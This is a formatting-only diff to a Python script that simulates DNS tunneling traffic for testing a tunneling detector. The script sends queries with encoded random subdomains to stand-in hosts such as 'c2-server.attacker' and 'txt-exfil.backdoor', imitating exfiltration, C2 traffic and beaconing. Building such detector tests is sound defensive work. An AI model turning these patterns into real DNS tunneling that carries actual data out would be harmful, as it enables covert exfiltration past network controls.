@@ -11,42 +11,42 @@ Generates suspicious DNS query patterns:
 WARNING: Use only on authorized systems for testing purposes!
 """
 
-import socket
-import time
-import sys
-import random
 import base64
+import random
+import socket
 import string
+import sys
+import time
 from datetime import datetime
 
 
 def print_header(msg):
     """Print formatted header"""
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print(f"  {msg}")
-    print("="*60 + "\n")
+    print("=" * 60 + "\n")
 
 
 def generate_base64_subdomain(data_length=30):
     """Generate a base64-encoded subdomain"""
     # Simulate encoded data
-    data = ''.join(random.choices(string.ascii_letters + string.digits, k=data_length))
-    encoded = base64.b64encode(data.encode()).decode().rstrip('=')
+    data = "".join(random.choices(string.ascii_letters + string.digits, k=data_length))
+    encoded = base64.b64encode(data.encode()).decode().rstrip("=")
     # Make it look like a subdomain
-    return encoded.lower().replace('+', '').replace('/', '')
+    return encoded.lower().replace("+", "").replace("/", "")
 
 
 def generate_hex_subdomain(length=40):
     """Generate a hex-encoded subdomain"""
-    return ''.join(random.choices('0123456789abcdef', k=length))
+    return "".join(random.choices("0123456789abcdef", k=length))
 
 
 def generate_random_subdomain(length=50):
     """Generate a random high-entropy subdomain"""
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
 
-def dns_query(subdomain, domain, dns_server='8.8.8.8', record_type='A'):
+def dns_query(subdomain, domain, dns_server="8.8.8.8", record_type="A"):
     """
     Send a DNS query.
 
@@ -203,7 +203,7 @@ def high_frequency_beacon(base_domain, query_count, rate):
     failed = 0
 
     # Use consistent beacon format (UUID-like)
-    beacon_id = ''.join(random.choices('0123456789abcdef', k=32))
+    beacon_id = "".join(random.choices("0123456789abcdef", k=32))
 
     for i in range(query_count):
         # Generate beacon with sequence number
@@ -263,16 +263,16 @@ def txt_record_exfiltration(base_domain, query_count, rate):
 
 
 if __name__ == "__main__":
-    print("\n" + "="*60)
+    print("\n" + "=" * 60)
     print("  DNS TUNNELING SIMULATION TOOL")
     print("  For Testing DNS Tunneling Detector")
-    print("="*60)
+    print("=" * 60)
 
     print("\n📝 NOTE: This script generates DNS queries only.")
     print("   Actual DNS tunneling requires a cooperating DNS server.")
     print("   These queries will fail but generate suspicious traffic patterns.\n")
 
-    if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
+    if len(sys.argv) > 1 and sys.argv[1] in ["-h", "--help"]:
         print("Usage:")
         print(f"  {sys.argv[0]}")
         print("\nThis will run DNS tunneling simulations with:")
@@ -291,40 +291,24 @@ if __name__ == "__main__":
     base64_exfiltration_simulation(
         base_domain="suspicious-tunnel.malicious",
         query_count=25,
-        rate=0.5  # 1 query every 2 seconds (high rate for small window)
+        rate=0.5,  # 1 query every 2 seconds (high rate for small window)
     )
     time.sleep(1)
 
     # Scenario 2: C2 communication with hex encoding
-    hex_c2_simulation(
-        base_domain="c2-server.attacker",
-        query_count=20,
-        rate=0.4
-    )
+    hex_c2_simulation(base_domain="c2-server.attacker", query_count=20, rate=0.4)
     time.sleep(1)
 
     # Scenario 3: Covert channel with random subdomains
-    random_covert_channel(
-        base_domain="covert-data.evil",
-        query_count=18,
-        rate=0.3
-    )
+    random_covert_channel(base_domain="covert-data.evil", query_count=18, rate=0.3)
     time.sleep(1)
 
     # Scenario 4: High frequency beaconing
-    high_frequency_beacon(
-        base_domain="periodic-beacon.malware",
-        query_count=30,
-        rate=0.6
-    )
+    high_frequency_beacon(base_domain="periodic-beacon.malware", query_count=30, rate=0.6)
     time.sleep(1)
 
     # Scenario 5: TXT record exfiltration
-    txt_record_exfiltration(
-        base_domain="txt-exfil.backdoor",
-        query_count=15,
-        rate=0.3
-    )
+    txt_record_exfiltration(base_domain="txt-exfil.backdoor", query_count=15, rate=0.3)
 
     print_header("DNS TUNNELING SIMULATION COMPLETE")
     print("✅ All scenarios executed")
